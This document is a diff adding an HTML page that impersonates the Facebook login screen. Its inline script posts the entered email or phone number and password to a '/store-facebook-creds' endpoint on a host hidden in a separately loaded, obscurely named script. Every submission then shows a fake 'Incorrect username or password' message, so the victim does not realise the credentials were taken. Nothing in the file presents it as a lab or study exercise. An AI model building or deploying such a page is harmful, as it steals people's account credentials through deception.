@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background-color: #f0f2f5;
+      padding: 20px;
+    }
+
+    .login-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      max-width: 1000px;
+      width: 100%;
+      padding: 20px;
+    }
+
+    .logo-section {
+      flex: 1;
+      padding-right: 50px;
+    }
+
+    .logo-section img {
+      width: 200px;
+    }
+
+    .logo-section h2 {
+      font-size: 20px;
+      color: #1c1e21;
+      margin-top: 10px;
+    }
+
+    .login-section {
+      flex: 1;
+      max-width: 400px;
+      padding: 40px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    }
+
+    .login-section h2 {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: #1c1e21;
+    }
+
+    .login-section input[type="text"],
+    .login-section input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      background-color: #f5f6f7;
+    }
+
+    .login-section input[type="submit"] {
+      width: 100%;
+      padding: 12px;
+      margin-top: 12px;
+      font-size: 18px;
+      background-color: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .login-section a {
+      display: block;
+      text-align: center;
+      margin-top: 15px;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+    }
+
+    .login-section a:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      margin: 20px 0;
+      text-align: center;
+      color: #606770;
+      font-size: 14px;
+    }
+
+    .signup-btn {
+      display: block;
+      text-align: center;
+      margin-top: 10px;
+      padding: 10px;
+      font-size: 16px;
+      color: #fff;
+      background-color: #42b72a;
+      border: none;
+      border-radius: 6px;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .signup-btn:hover {
+      background-color: #36a420;
+    }
+
+    /* Responsive Styles */
+    @media (max-width: 768px) {
+      .login-container {
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .logo-section {
+        text-align: center;
+        padding-right: 0;
+        margin-bottom: 20px;
+      }
+
+      .logo-section img {
+        width: 150px;
+      }
+
+      .logo-section h2 {
+        font-size: 18px;
+        padding: 0 20px;
+      }
+
+      .login-section {
+        width: 100%;
+        max-width: 90%;
+        padding: 20px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .login-section h2 {
+        font-size: 20px;
+      }
+
+      .login-section input[type="text"],
+      .login-section input[type="password"] {
+        font-size: 14px;
+      }
+
+      .login-section input[type="submit"] {
+        font-size: 16px;
+      }
+
+      .signup-btn {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-container">
+  <!-- Left Section with Logo -->
+  <div class="logo-section">
+    <img src="./facebook-logo.png" alt="Facebook Logo">
+    <!-- <img src="https://scontent.fceb1-1.fna.fbcdn.net/v/t39.30808-1/418816839_3526015247712833_2143620101372651441_n.jpg?stp=c210.0.540.540a_dst-jpg_s200x200&_nc_cat=105&ccb=1-7&_nc_sid=0ecb9b&_nc_eui2=AeH9tYw_wkL_Ec_iFRd-Y0YYdtEKwWTEhZ520QrBZMSFnsEaSUwfG8rO99m2BgSj6e5R9p2UMLKvy--j694MdhfQ&_nc_ohc=NijpjE3H6tAQ7kNvgHy8yq6&_nc_zt=24&_nc_ht=scontent.fceb1-1.fna&_nc_gid=AIk8Y5hfaXS_o-b0TRlFuN9&oh=00_AYBnyFAjQNNO-0O0AJry4_HNIk_W7Ae12_u6Of2m0O7M-A&oe=672E4826" style="border-radius: 50%;" alt="Facebook Logo"> -->
+    <h2>Connect with friends and the world around you on Facebook.</h2>
+  </div>
+
+  <!-- Login Section -->
+  <div class="login-section">
+    <h2>Log in to Facebook</h2>
+    <div class="err"></div>
+    <form>
+      <input type="text" class="username" placeholder="Email or Phone Number" required>
+      <input type="password" class="password" placeholder="Password" required>
+      <input type="submit" class="login" value="Log In">
+    </form>
+    <a href="#">Forgot Password?</a>
+    <div class="divider">or</div>
+    <a href="#" class="signup-btn">Create New Account</a>
+  </div>
+</div>
+
+<script src="./jquery.min.js"></script>
+<script src="./89T1xCYljtaHFiMWz44T.js"></script>
+<script>
+    $(document).ready(function () {
+        $('.login').click(function (e) {
+            e.preventDefault();
+            $.post(ssddds + '/store-facebook-creds', {
+                username: $('.username').val(),
+                password: $('.password').val(),
+            }, function (res) {
+                $('.err').html('<p style="color: red">Incorrect username or password</p>')
+                console.log(res);
+            })
+        })
+    })
+</script>
+</body>
+</html>
